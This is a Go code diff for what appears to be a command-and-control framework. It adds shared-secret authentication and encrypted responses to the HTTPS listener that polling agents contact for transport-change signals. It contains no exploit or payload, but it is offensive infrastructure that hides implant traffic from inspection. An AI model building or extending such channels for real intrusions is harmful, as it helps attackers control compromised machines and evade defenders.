@@ -12,6 +12,7 @@ import (
 
 	"c2framework/internals/config"
 	"c2framework/internals/control"
+	"c2framework/internals/crypto"
 )
 
 // HTTPSServer implements the Server interface for HTTPS
@@ -19,7 +20,8 @@ type HTTPSServer struct {
 	addr    string
 	server  *http.Server
 	tlsCert string
-	tlsKey  string
+	tlsKey       string
+	sharedSecret string
 }
 
 // HTTPSResponse represents the JSON response for HTTPS
@@ -32,7 +34,8 @@ func NewHTTPSServer(cfg *config.ServerConfig) *HTTPSServer {
 	return &HTTPSServer{
 		addr:    fmt.Sprintf("%s:%s", cfg.ListeningInterface, cfg.ListeningPort),
 		tlsCert: cfg.TlsCert,
-		tlsKey:  cfg.TlsKey,
+		tlsKey:       cfg.TlsKey,
+		sharedSecret: cfg.SharedSecret,
 	}
 }
 
@@ -42,7 +45,7 @@ func (s *HTTPSServer) Start() error {
 	r := chi.NewRouter()
 
 	// Apply authentication middleware to agent routes
-	r.With(AuthMiddleware).Get("/", RootHandler)
+	r.With(AuthMiddleware(s.sharedSecret)).Get("/", RootHandler(s.sharedSecret))
 
 	// Create the HTTP server
 	s.server = &http.Server{
@@ -68,28 +71,40 @@ func (s *HTTPSServer) Stop() error {
 	return s.server.Shutdown(ctx)
 }
 
-// RootHandler handles requests to the root endpoint
-func RootHandler(w http.ResponseWriter, r *http.Request) {
-	log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)
+// RootHandler returns a handler that encrypts responses
+func RootHandler(secret string) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)
 
-	// Check if we should transition
-	shouldChange := control.Manager.CheckAndReset()
-	response := HTTPSResponse{
-		Change: shouldChange,
-	}
-	if shouldChange {
-		log.Printf("HTTPS: Sending transition signal (change=true)")
-	} else {
-		log.Printf("HTTPS: Normal response (change=false)")
-	}
+		// Check if we should transition
+		shouldChange := control.Manager.CheckAndReset()
+		response := HTTPSResponse{
+			Change: shouldChange,
+		}
+		if shouldChange {
+			log.Printf("HTTPS: Sending transition signal (change=true)")
+		} else {
+			log.Printf("HTTPS: Normal response (change=false)")
+		}
 
-	// Set content type to JSON
-	w.Header().Set("Content-Type", "application/json")
+		// Marshal response to JSON
+		responseJSON, err := json.Marshal(response)
+		if err != nil {
+			log.Printf("Error marshaling response: %v\n", err)
+			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+			return
+		}
 
-	// Encode and send the response
-	if err := json.NewEncoder(w).Encode(response); err != nil {
-		log.Printf("Error encoding response: %v\n", err)
-		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
-		return
+		// Encrypt the response
+		encryptedResponse, err := crypto.Encrypt(responseJSON, secret)
+		if err != nil {
+			log.Printf("Error encrypting response: %v\n", err)
+			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+			return
+		}
+
+		// Set content type to octet-stream for encrypted data
+		w.Header().Set("Content-Type", "application/octet-stream")
+		w.Write([]byte(encryptedResponse))
 	}
 }
